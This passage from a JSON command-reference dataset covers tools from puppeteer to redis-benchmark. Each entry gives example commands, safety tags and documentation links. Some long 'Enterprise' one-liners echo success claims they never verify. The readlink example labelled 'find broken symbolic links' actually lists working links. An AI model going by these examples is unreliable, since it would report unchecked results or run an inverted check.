        "url": "https://www.pulumi.com/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "puppeteer",
    "subtitle": "Puppeteer",
    "description": "Control headless Chrome or Chromium browsers",
    "examples": [
      "node generate-pdf.js  # Use Puppeteer script to convert webpage to PDF",
      "node screenshot.js  # Capture screenshot of webpage using Puppeteer",
      "node scraper.js  # Extract data from JavaScript-rendered webpage",
      "node performance-test.js  # Measure webpage performance metrics",
      "node -e \"const puppeteer = require('puppeteer'); (async () => { const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(process.env.TARGET_URL); const metrics = await page.metrics(); const screenshot = await page.screenshot({path: 'performance-audit-$(date +%Y%m%d-%H%M%S).png', fullPage: true}); await browser.close(); console.log(JSON.stringify({timestamp: new Date().toISOString(), url: process.env.TARGET_URL, metrics: metrics, screenshot: 'performance-audit-$(date +%Y%m%d-%H%M%S).png'}, null, 2)); })();\" | tee performance-metrics-$(date +%Y%m%d-%H%M%S).json && echo \"Enterprise web performance audit completed: metrics captured, full-page screenshot saved, performance data archived for analysis\"  # Enterprise web performance monitoring with automated metrics collection, visual documentation, and structured data archival"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "Node.js API - programmatic usage",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web scraping pipeline",
        "commands": "node scraper.js && node process-data.js && node generate-report.js",
        "explanation": "Complete web scraping and reporting pipeline",
        "title": "node && node && node"
      }
    ],
    "relatedCommands": [
      {
        "name": "playwright",
        "relationship": "multi-browser-alternative",
        "reason": "Playwright supports multiple browsers, Puppeteer focuses on Chrome"
      },
      {
        "name": "selenium",
        "relationship": "traditional-alternative",
        "reason": "Selenium offers multi-browser support with different approach"
      }
    ],
    "warnings": [
      "Chrome/Chromium only - no Firefox or Safari",
      "Excellent for web scraping and PDF generation",
      "Headless by default but can run in full Chrome"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://pptr.dev/"
      },
      {
        "platform": "macos",
        "url": "https://pptr.dev/"
      },
      {
        "platform": "windows",
        "url": "https://pptr.dev/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pwd",
    "subtitle": "print working directory",
    "description": "Print current working directory path",
    "examples": [
      "pwd  # Show full path of current directory",
      "pwd | pbcopy  # Get current path for use in scripts or commands (macOS)",
      "CURRENT_DIR=$(pwd)  # Store current directory in variable for later use",
      "PROJECT_ROOT=$(pwd) && echo \"Project: $(basename $PROJECT_ROOT)\" && echo \"Path: $PROJECT_ROOT\" && echo \"Files: $(find . -type f | wc -l)\" && echo \"Size: $(du -sh . | cut -f1)\" && git rev-parse --git-dir >/dev/null 2>&1 && echo \"Git: $(git branch --show-current) ($(git rev-parse --short HEAD))\" || echo \"Git: Not a git repository\" && echo \"Environment: $(echo $PATH | tr ':' '\\n' | wc -l) PATH entries\" | tee project-context-$(date +%Y%m%d-%H%M%S).log && echo \"Enterprise project context captured: directory structure, git status, environment details documented for development workflow\"  # Enterprise project context analysis with comprehensive directory information, git status, file statistics, and environment documentation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "pwd",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Navigate and confirm location",
        "commands": "cd /some/path && pwd",
        "explanation": "Change directory and verify you're in the right place",
        "title": "cd && pwd"
      },
      {
        "scenario": "Create file with current path in name",
        "commands": "touch \"backup-$(pwd | sed 's/\\//-/g').txt\"",
        "explanation": "Generate filename incorporating current directory path",
        "title": "touch | sed"
      }
    ],
    "relatedCommands": [
      {
        "name": "cd",
        "relationship": "combo",
        "reason": "Often used together to navigate and confirm location"
      },
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "Check location then see what's in current directory"
      }
    ],
    "warnings": [
      "pwd shows absolute path, not relative",
      "Symbolic links may show different paths with -P option"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/pwd.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/pwd.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/pwd-invocation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pytest",
    "subtitle": "Python Test",
    "description": "Python testing framework for writing simple and scalable test cases",
    "examples": [
      "pytest  # Discover and run all tests in current directory and subdirectories",
      "pytest test_example.py  # Run tests in specific file",
      "pytest -v  # Show detailed test results with function names",
      "pytest -k 'test_login'  # Run only tests containing 'test_login' in name",
      "pytest --cov=mypackage  # Run tests with coverage analysis for mypackage",
      "pytest -x  # Stop testing after first test failure",
      "pytest -n 4  # Run tests using 4 parallel processes (requires pytest-xdist)",
      "pytest --cov=src --cov-report=html --cov-report=xml --cov-report=term --cov-fail-under=80 --junitxml=test-results.xml -v && python -c \"import xml.etree.ElementTree as ET; tree=ET.parse('test-results.xml'); root=tree.getroot(); print(f'Test Results: {root.get(\"tests\")} tests, {root.get(\"failures\")} failures, {root.get(\"errors\")} errors, {root.get(\"time\")}s duration')\" && coverage html && echo \"Enterprise test suite completed: $(coverage report --precision=2 | tail -1 | awk '{print $4}') coverage achieved, HTML report generated, CI/CD metrics captured\"  # Enterprise Python testing pipeline with comprehensive coverage analysis, multiple report formats, CI/CD integration, and automated quality gates"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pytest [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive test run",
        "commands": "pytest -v --cov=src --cov-report=html --cov-report=term",
        "explanation": "Run tests with verbose output and generate HTML coverage report",
        "title": "pytest"
      }
    ],
    "relatedCommands": [
      {
        "name": "unittest",
        "relationship": "alternative",
        "reason": "Python's built-in testing framework"
      },
      {
        "name": "nose2",
        "relationship": "alternative",
        "reason": "Another Python testing framework"
      }
    ],
    "warnings": [
      "Test discovery looks for files matching test_*.py or *_test.py",
      "Fixtures provide powerful setup/teardown capabilities",
      "Plugins extend functionality significantly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.pytest.org/"
      },
      {
        "platform": "macos",
        "url": "https://docs.pytest.org/"
      },
      {
        "platform": "windows",
        "url": "https://docs.pytest.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "python",
    "subtitle": "Python",
    "description": "Python programming language interpreter",
    "examples": [
      "python script.py  # Execute Python script file",
      "python  # Enter Python interactive interpreter (REPL)",
      "python -c 'print(\"Hello World\")'  # Run Python code from command line",
      "python --version  # Display installed Python version",
      "python -m http.server 8000  # Start HTTP server using Python module",
      "python -c \"import sys, platform, pkg_resources; print(f'Python: {sys.version}'); print(f'Platform: {platform.platform()}'); print(f'Packages: {len([p.project_name for p in pkg_resources.working_set])}'); [print(f'{p.project_name}=={p.version}') for p in sorted(pkg_resources.working_set, key=lambda x: x.project_name)]\" | head -20 && python -m pip list --outdated --format=json | python -c \"import json, sys; data=json.load(sys.stdin); print(f'Outdated: {len(data)} packages need updates') if data else print('All packages up to date')\" && echo \"Enterprise Python environment audit: interpreter version, platform details, package inventory, security updates identified\"  # Enterprise Python environment analysis with comprehensive package auditing, version management, and security assessment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "python [options] [script] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Run script with environment setup",
        "commands": "export PYTHONPATH=/custom/path && python script.py",
        "explanation": "Set Python path and run script",
        "title": "export && python"
      },
      {
        "scenario": "Install and run package",
        "commands": "pip install requests && python -c 'import requests; print(requests.get(\"https://httpbin.org/json\").json())'",
        "explanation": "Install package and use it in one-liner",
        "title": "pip && python ; print"
      }
    ],
    "relatedCommands": [
      {
        "name": "pip",
        "relationship": "combo",
        "reason": "Package manager for Python libraries"
      },
      {
        "name": "python3",
        "relationship": "similar",
        "reason": "Explicit Python 3 interpreter"
      },
      {
        "name": "virtualenv",
        "relationship": "combo",
        "reason": "Create isolated Python environments"
      }
    ],
    "warnings": [
      "python may point to Python 2.x on some systems",
      "Use python3 explicitly when both versions installed",
      "Module import paths can be tricky in complex projects"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.python.org/3/"
      },
      {
        "platform": "macos",
        "url": "https://docs.python.org/3/"
      },
      {
        "platform": "windows",
        "url": "https://docs.python.org/3/"
      },
      {
        "platform": "generic",
        "url": "https://docs.python.org/3/using/cmdline.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "python3",
    "subtitle": "Python 3",
    "description": "Python 3 interpreter for data science, ML and scripting",
    "examples": [
      "python3 script.py  # Execute Python script file",
      "python3  # Launch Python interactive interpreter (REPL)",
      "python3 -c \"print('Hello, World!')\"  # Run Python code from command line",
      "python3 -m http.server 8000  # Start HTTP server using built-in module",
      "python3 -m pip install requests  # Install Python package using pip module",
      "python3 -m venv myenv  # Create isolated Python environment",
      "python3 -m py_compile script.py  # Compile Python script to check for syntax errors",
      "python3 -m cProfile script.py  # Run script with performance profiling",
      "python3 -m venv production-env && source production-env/bin/activate && pip install --upgrade pip wheel setuptools && pip install -r requirements.txt --no-deps --require-hashes && python -m pip check && python -c \"import sys; print(f'Environment: {sys.prefix}'); import pkg_resources; print(f'Packages: {len(list(pkg_resources.working_set))}')\" && python -m pytest --no-cov -q && echo \"Enterprise Python deployment: isolated environment, secure dependencies, integrity verified, tests passed, production-ready\"  # Enterprise Python deployment pipeline with isolated environments, secure dependency installation, integrity verification, and production validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "python3 [options] <file> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Virtual environment workflow",
        "commands": "python3 -m venv venv && source venv/bin/activate && python3 -m pip install -r requirements.txt",
        "explanation": "Create virtual environment, activate it, install dependencies",
        "title": "python3 && source && python3"
      },
      {
        "scenario": "Development server with auto-reload",
        "commands": "python3 -m pip install flask && python3 app.py",
        "explanation": "Install Flask then run development application",
        "title": "python3 && python3"
      },
      {
        "scenario": "Set up data science environment",
        "commands": "python3 -m venv dsenv && source dsenv/bin/activate && python3 -m pip install pandas numpy scipy matplotlib jupyter",
        "explanation": "Creates virtual environment and installs essential data science packages",
        "title": "python3 && source && python3"
      },
      {
        "scenario": "Run script with profiling",
        "commands": "python3 -m cProfile -o profile.stats analysis.py && python3 -c 'import pstats; pstats.Stats(\"profile.stats\").sort_stats(\"cumulative\").print_stats(10)'",
        "explanation": "Profiles script execution and shows top 10 time-consuming functions",
        "title": "python3 && python3 ; pstats"
      }
    ],
    "relatedCommands": [
      {
        "name": "pip3",
        "relationship": "package-manager",
        "reason": "Package installer for Python modules and libraries"
      },
      {
        "name": "virtualenv",
        "relationship": "alternative",
        "reason": "Third-party virtual environment tool"
      },
      {
        "name": "jupyter",
        "relationship": "combo",
        "reason": "Jupyter notebooks run Python code interactively"
      }
    ],
    "warnings": [
      "python vs python3 command varies by system",
      "Virtual environments isolate packages but not Python version",
      "Module import paths depend on PYTHONPATH and current directory"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.python.org/3/using/cmdline.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.python.org/3/using/cmdline.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.python.org/3/using/windows.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.python.org/3/tutorial/"
      }
    ],
    "distroNotes": {
      "linux": "Usually pre-installed, additional packages via package manager",
      "windows": "Available from Microsoft Store, python.org, or Anaconda",
      "macos": "Pre-installed, Homebrew provides latest versions"
    }
  },
  {
    "name": "qemu",
    "subtitle": "Quick Emulator",
    "description": "Machine emulator and virtualizer",
    "examples": [
      "qemu-system-x86_64 -hda vm.qcow2 -m 2048 -cdrom install.iso  # Create VM with 2GB RAM, disk image, and installation ISO",
      "qemu-img create -f qcow2 vm-disk.qcow2 20G  # Create 20GB QCOW2 disk image",
      "qemu-img convert -f vmdk -O qcow2 source.vmdk dest.qcow2  # Convert VMDK image to QCOW2 format",
      "qemu-system-x86_64 -enable-kvm -hda vm.qcow2 -m 4096  # Run VM with KVM hardware acceleration",
      "qemu-system-x86_64 -hda vm.qcow2 -vnc :1 -daemonize  # Run VM in background with VNC access on port 5901",
      "qemu-img info vm-disk.qcow2  # Display information about disk image",
      "qemu-img create -f qcow2 -o compression_type=zstd,cluster_size=2M enterprise-vm-$(date +%Y%m%d).qcow2 100G && qemu-system-x86_64 -enable-kvm -cpu host -smp $(nproc) -m 8192 -drive file=enterprise-vm-$(date +%Y%m%d).qcow2,if=virtio,cache=writeback -netdev user,id=net0,hostfwd=tcp::2222-:22 -device virtio-net,netdev=net0 -vnc :1 -daemonize && echo \"Enterprise virtualization environment: KVM-accelerated VM with $(nproc) cores, 8GB RAM, optimized storage, SSH forwarding on port 2222, VNC on :1\" && sleep 5 && ss -tlnp | grep :2222 && echo \"SSH forwarding active for remote management\"  # Enterprise virtualization deployment with KVM acceleration, optimized storage compression, comprehensive resource allocation, and remote management capabilities"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "qemu-system-x86_64 [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "VM creation and setup",
        "commands": "qemu-img create -f qcow2 new-vm.qcow2 50G && qemu-system-x86_64 -hda new-vm.qcow2 -m 4096 -cdrom ubuntu.iso -boot d",
        "explanation": "Create disk image and install OS from ISO",
        "title": "qemu && qemu"
      }
    ],
    "relatedCommands": [
      {
        "name": "virsh",
        "relationship": "alternative",
        "reason": "Higher-level virtualization management"
      },
      {
        "name": "virt-manager",
        "relationship": "alternative",
        "reason": "GUI virtualization management"
      }
    ],
    "warnings": [
      "KVM requires CPU virtualization support",
      "Complex command-line syntax"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.qemu.org/documentation/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "R",
    "subtitle": "R",
    "description": "Statistical computing and graphics programming language",
    "examples": [
      "R  # Launch R console for interactive data analysis",
      "Rscript analysis.R  # Execute R script non-interactively",
      "R -e \"print('Hello World')\"  # Execute R code directly from command line",
      "R -e \"install.packages('ggplot2')\"  # Install ggplot2 package for data visualization",
      "R CMD BATCH script.R output.txt  # Run R script in batch mode with output redirection",
      "R --version  # Display R version and configuration information",
      "R --vanilla  # Start R without loading .Rprofile or .Renviron",
      "R --slave --vanilla -e \"install.packages(c('tidyverse', 'data.table', 'ggplot2', 'dplyr', 'plotly'), repos='https://cran.rstudio.com/', dependencies=TRUE); library(tidyverse); sessionInfo()\" && R --slave -e \"data <- data.frame(x=1:100, y=rnorm(100)); model <- lm(y ~ x, data=data); summary(model); png('analysis-$(date +%Y%m%d-%H%M%S).png'); plot(data\$x, data\$y, main='Enterprise Data Analysis'); abline(model, col='red'); dev.off(); cat('Analysis completed: correlation =', cor(data\$x, data\$y), '\\n')\" && echo \"Enterprise R analytics environment: essential packages installed, statistical analysis performed, visualization generated, ready for data science workflows\"  # Enterprise R data science environment with comprehensive package installation, statistical modeling, automated visualization, and production analytics capabilities"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "R [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Data analysis pipeline",
        "commands": "R -e \"library(readr); data <- read_csv('data.csv'); summary(data)\"",
        "explanation": "Load data and generate summary statistics",
        "title": "R ; data < ; summary"
      },
      {
        "scenario": "Generate report",
        "commands": "R -e \"rmarkdown::render('report.Rmd')\"",
        "explanation": "Render R Markdown document to HTML/PDF",
        "title": "R"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "alternative",
        "reason": "Python with pandas/numpy for data science"
      },
      {
        "name": "julia",
        "relationship": "similar",
        "reason": "High-performance scientific computing language"
      },
      {
        "name": "octave",
        "relationship": "similar",
        "reason": "MATLAB-compatible scientific computing"
      }
    ],
    "warnings": [
      "Package installation requires internet connection",
      "Memory usage can be high with large datasets",
      "Base R vs tidyverse syntax differences"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.r-project.org/"
      },
      {
        "platform": "macos",
        "url": "https://www.r-project.org/"
      },
      {
        "platform": "windows",
        "url": "https://www.r-project.org/"
      },
      {
        "platform": "generic",
        "url": "https://cran.r-project.org/doc/manuals/r-release/R-intro.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rabbitmqctl",
    "subtitle": "RabbitMQ Control",
    "description": "RabbitMQ management command line tool",
    "examples": [
      "rabbitmqctl status  # Shows current status of RabbitMQ node",
      "rabbitmqctl list_queues name messages consumers  # Shows queue names, message counts, and consumer counts",
      "rabbitmqctl add_user myuser mypassword  # Creates new RabbitMQ user with specified credentials",
      "rabbitmqctl set_permissions -p / myuser '.*' '.*' '.*'  # Allows user full access to default virtual host",
      "rabbitmqctl purge_queue orders  # Removes all messages from specified queue"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rabbitmqctl [options] command [command_options]",
    "prerequisites": [
      "rabbitmq-server",
      "erlang"
    ],
    "commandCombinations": [
      {
        "scenario": "Create user with admin permissions",
        "commands": "rabbitmqctl add_user admin password && rabbitmqctl set_user_tags admin administrator && rabbitmqctl set_permissions -p / admin '.*' '.*' '.*'",
        "explanation": "Creates admin user, sets admin tag, and grants full permissions",
        "title": "rabbitmqctl && rabbitmqctl && rabbitmqctl"
      },
      {
        "scenario": "Backup and restore queue definitions",
        "commands": "rabbitmqctl export_definitions backup.json && rabbitmqctl import_definitions backup.json",
        "explanation": "Exports current configuration and imports it back",
        "title": "rabbitmqctl && rabbitmqctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "rabbitmq-plugins",
        "relationship": "related",
        "reason": "Manages RabbitMQ plugins and extensions"
      },
      {
        "name": "rabbitmq-diagnostics",
        "relationship": "related",
        "reason": "Provides health checks and diagnostics for RabbitMQ"
      },
      {
        "name": "rabbitmq-server",
        "relationship": "dependency",
        "reason": "The RabbitMQ server that this tool manages"
      }
    ],
    "warnings": [
      "Must run as same user as RabbitMQ server or with sudo",
      "Node name must match if connecting to remote nodes",
      "Some operations require server restart to take effect",
      "Virtual host permissions are required for most operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.rabbitmq.com/rabbitmqctl.8.html"
      },
      {
        "platform": "macos",
        "url": "https://www.rabbitmq.com/rabbitmqctl.8.html"
      },
      {
        "platform": "windows",
        "url": "https://www.rabbitmq.com/rabbitmqctl.8.html"
      },
      {
        "platform": "generic",
        "url": "https://www.rabbitmq.com/management-cli.html"
      }
    ],
    "distroNotes": {
      "windows": "Included with RabbitMQ Windows installation",
      "linux": "Available through package managers or RabbitMQ installation",
      "macos": "Included with Homebrew RabbitMQ installation"
    }
  },
  {
    "name": "rails",
    "subtitle": "Ruby on Rails",
    "description": "Ruby on Rails web application framework CLI",
    "examples": [
      "rails new my_app  # Generate new Rails application with default configuration",
      "rails server  # Start Rails development server on port 3000",
      "rails generate model User name:string email:string  # Create User model with name and email attributes",
      "rails db:migrate  # Apply pending database migrations",
      "rails console  # Start interactive Ruby console with Rails environment loaded",
      "rails test  # Execute all tests in the Rails application"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rails <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup new application",
        "commands": "rails new blog && cd blog && rails generate scaffold Post title:string content:text && rails db:migrate",
        "explanation": "Create new app, generate scaffold, and setup database",
        "title": "rails && cd && rails && rails"
      }
    ],
    "relatedCommands": [
      {
        "name": "bundler",
        "relationship": "combo",
        "reason": "Manages Rails and its dependencies"
      },
      {
        "name": "rake",
        "relationship": "combo",
        "reason": "Rails uses Rake for many tasks"
      }
    ],
    "warnings": [
      "Database must be configured and running for migrations",
      "Different Rails versions have different generator syntax",
      "Asset pipeline configuration varies by Rails version"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://guides.rubyonrails.org/command_line.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rake",
    "subtitle": "Ruby Make",
    "description": "Ruby build program with capabilities similar to make",
    "examples": [
      "rake -T  # Show all available Rake tasks with descriptions",
      "rake  # Execute default task defined in Rakefile",
      "rake test  # Execute test task",
      "rake build  # Run build task and its dependencies",
      "rake -n build  # Show what would be executed without running",
      "rake db:migrate  # Run database migrations (Rails projects)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rake [options] [tasks]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Rails deployment workflow",
        "commands": "rake assets:precompile && rake db:migrate && rake test",
        "explanation": "Precompile assets, migrate database, and run tests",
        "title": "rake && rake && rake"
      }
    ],
    "relatedCommands": [
      {
        "name": "make",
        "relationship": "inspiration",
        "reason": "Rake is inspired by make but uses Ruby syntax"
      },
      {
        "name": "bundle",
        "relationship": "combo",
        "reason": "Bundle manages gems, Rake runs tasks"
      }
    ],
    "warnings": [
      "Uses Rakefile with Ruby syntax for task definitions",
      "Very popular in Ruby on Rails applications",
      "Task dependencies are automatically handled"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/ruby/rake"
      },
      {
        "platform": "macos",
        "url": "https://github.com/ruby/rake"
      },
      {
        "platform": "windows",
        "url": "https://github.com/ruby/rake"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rar",
    "subtitle": "Roshal Archive",
    "description": "Create and extract RAR archives with high compression",
    "examples": [
      "rar a archive.rar file1 file2  # Create RAR archive with specified files",
      "rar x archive.rar  # Extract all files with full paths",
      "rar l archive.rar  # List files in RAR archive",
      "rar a -p archive.rar secret/  # Create encrypted RAR archive",
      "rar a -v100m archive.rar largefile  # Split archive into 100MB volumes",
      "rar a -hp$(openssl rand -base64 16) -rr15% -v1000M -m5 enterprise-backup-$(date +%Y%m%d).rar /critical/data/ && rar t enterprise-backup-$(date +%Y%m%d).rar && du -sh enterprise-backup-$(date +%Y%m%d).rar* && echo \"Enterprise secure backup: password-protected, 15% recovery record, 1GB volumes, maximum compression, $(ls enterprise-backup-$(date +%Y%m%d).rar* | wc -l) archive parts created\"  # Enterprise secure backup creation with strong password protection, enhanced recovery capabilities, volume splitting, and maximum compression for critical data preservation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rar [command] [options] archive files",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup with recovery",
        "commands": "rar a -rr10% backup.rar ~/important && rar t backup.rar",
        "explanation": "Create archive with 10% recovery record and test",
        "title": "rar && rar"
      }
    ],
    "relatedCommands": [
      {
        "name": "unrar",
        "relationship": "combo",
        "reason": "unrar is free tool for extracting RAR archives"
      },
      {
        "name": "7z",
        "relationship": "alternative",
        "reason": "7z can also handle RAR files and has similar features"
      }
    ],
    "warnings": [
      "Commercial software (unrar is free for extraction)",
      "Proprietary format with patent restrictions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.rarlab.com/rar_add.htm"
      },
      {
        "platform": "macos",
        "url": "https://www.rarlab.com/rar_add.htm"
      },
      {
        "platform": "windows",
        "url": "https://www.rarlab.com/rar_add.htm"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "react-native",
    "subtitle": "React Native",
    "description": "React Native CLI for building cross-platform mobile applications",
    "examples": [
      "react-native init MyApp  # Creates a new React Native project with default configuration and dependencies",
      "react-native start  # Starts the Metro bundler that serves the JavaScript bundle for development",
      "react-native run-ios  # Builds the iOS app and launches it in the iOS simulator",
      "react-native run-android  # Builds the Android app and launches it in connected Android emulator or device",
      "react-native link  # Automatically links native dependencies to iOS and Android projects",
      "npx react-native@latest init ProductionApp --template react-native-template-typescript && cd ProductionApp && npm install @react-native-async-storage/async-storage react-native-keychain @react-navigation/native && npx pod-install ios && npx react-native run-ios --configuration Release && npx react-native run-android --variant=release && echo \"Enterprise React Native deployment: TypeScript template, secure storage, navigation, iOS pods configured, release builds successful for both platforms\"  # Enterprise React Native development pipeline with TypeScript, secure storage solutions, navigation framework, and production-ready release configurations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "react-native [command] [options]",
    "prerequisites": [
      "node",
      "npm"
    ],
    "commandCombinations": [
      {
        "scenario": "Create and run new React Native app",
        "commands": "react-native init MyApp && cd MyApp && react-native start",
        "explanation": "Creates new project, navigates into it, and starts development server",
        "title": "react && cd && react"
      },
      {
        "scenario": "Build for both platforms simultaneously",
        "commands": "react-native run-ios & react-native run-android",
        "explanation": "Starts iOS and Android builds in parallel for testing on both platforms",
        "title": "react & react"
      }
    ],
    "relatedCommands": [
      {
        "name": "npx react-native",
        "relationship": "alternative",
        "reason": "Run React Native commands without global installation using npx"
      },
      {
        "name": "expo",
        "relationship": "managed",
        "reason": "Managed React Native development with additional services and tools"
      },
      {
        "name": "flutter",
        "relationship": "competitor",
        "reason": "Alternative cross-platform mobile framework using Dart language"
      }
    ],
    "warnings": [
      "Metro bundler must be running for development",
      "iOS builds require macOS and Xcode installation",
      "Android builds need Android SDK and proper environment setup",
      "Native linking may require manual configuration for complex dependencies"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "macos",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "windows",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "generic",
        "url": "https://reactnative.dev/docs/getting-started"
      }
    ],
    "distroNotes": {
      "windows": "Requires Node.js and development environment setup",
      "macos": "Full iOS development requires Xcode",
      "linux": "Android development only, no iOS support"
    }
  },
  {
    "name": "readlink",
    "subtitle": "read link",
    "description": "Display symbolic link target",
    "examples": [
      "readlink symlink  # Display what symbolic link points to",
      "readlink -f symlink  # Resolve all symbolic links to get final target",
      "readlink -f /path/../file.txt  # Resolve .. and . components to absolute path",
      "readlink file.txt && echo 'Is a link' || echo 'Not a link'  # Test if file is a symbolic link",
      "find /usr/local/bin -type l | while read link; do target=$(readlink -f \"$link\"); if [ ! -e \"$target\" ]; then echo \"BROKEN: $link -> $target\"; else echo \"OK: $link -> $target\"; fi; done | tee symlink-audit-$(date +%Y%m%d-%H%M%S).log && echo \"Enterprise symlink integrity audit: $(grep -c BROKEN symlink-audit-$(date +%Y%m%d-%H%M%S).log) broken links identified, $(grep -c OK symlink-audit-$(date +%Y%m%d-%H%M%S).log) valid links verified\"  # Enterprise symbolic link integrity verification with comprehensive audit trail, broken link detection, and system maintenance reporting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "readlink [options] <link>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find broken symbolic links",
        "commands": "find . -type l -exec readlink -f {} \\; -exec test -e {} \\; -print",
        "explanation": "Find symbolic links and check if targets exist",
        "title": "find ; ;"
      },
      {
        "scenario": "Get real location of script",
        "commands": "SCRIPT_DIR=$(dirname $(readlink -f $0))",
        "explanation": "Get directory containing script even if called via symlink",
        "title": "SCRIPT_DIR"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "ls -la shows link targets but readlink gives more detail"
      },
      {
        "name": "ln",
        "relationship": "opposite",
        "reason": "ln creates links, readlink reads them"
      },
      {
        "name": "realpath",
        "relationship": "similar",
        "reason": "Both resolve paths to canonical form"
      }
    ],
    "warnings": [
      "readlink only works on symbolic links, not hard links",
      "May fail if intermediate directories don't exist",
      "Different options available between GNU and BSD versions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/readlink.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/readlink.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/readlink-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL"
    }
  },
  {
    "name": "redis-benchmark",
    "subtitle": "Redis Benchmark",
    "description": "Redis performance benchmarking and testing tool",
    "examples": [
      "redis-benchmark -h localhost -p 6379 -n 100000  # Run 100,000 requests against Redis server",
      "redis-benchmark -t SET,GET -n 100000 -d 100  # Test SET and GET operations with 100-byte values",
      "redis-benchmark -P 10 -n 100000  # Test with 10 commands pipelined per request",
      "redis-benchmark -c 50 -n 100000  # Use 50 concurrent connections for testing",
      "redis-benchmark -t SET -r 1000000 -n 100000  # Use random keys from 1 million key space",
      "redis-benchmark -q --csv -n 100000  # Run quietly and output results in CSV format",
      "redis-benchmark -t SET,GET -d 1024 -n 10000  # Test with 1KB data values",
      "redis-benchmark -l -t PING,SET,GET  # Run tests continuously until stopped"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "redis-benchmark [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive performance analysis",
